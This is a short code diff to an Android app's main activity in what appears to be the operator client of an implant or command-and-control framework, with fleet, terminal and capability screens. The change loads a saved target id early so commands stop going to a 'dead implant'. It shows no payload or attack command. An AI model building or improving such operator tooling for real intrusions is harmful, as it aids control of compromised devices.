@@ -11,6 +11,7 @@ import androidx.navigation.compose.composable
 import androidx.navigation.compose.rememberNavController
 import androidx.compose.runtime.Composable
 import com.shadow.operator.data.ClientConfig
+import com.shadow.operator.data.TargetStore
 import com.shadow.operator.data.RpcClient
 import com.shadow.operator.ui.fleet.FleetScreen
 import com.shadow.operator.ui.terminal.TerminalScreen
@@ -31,6 +32,15 @@ class MainActivity : ComponentActivity() {
 
         val config = ClientConfig()
         rpcClient = RpcClient(config)
+
+        // Apply the persisted target BEFORE any screen composes. RpcClient.activeTarget
+        // falls back to the identity baked into ClientConfig whenever targetId is blank,
+        // and after a reinstall that baked id belongs to a dead implant: every capability
+        // screen then queues commands into a target nobody polls and spins on "running"
+        // forever, while the home badge -- which reads the store directly -- happily shows
+        // the live implant. FleetScreen's LaunchedEffect only runs once its UI exists, so
+        // anything opened early (or recomposed without it) inherited the dead default.
+        TargetStore(this).selectedId().takeIf { it.isNotBlank() }?.let { rpcClient.targetId = it }
 
         setContent {
             ShadowTheme {
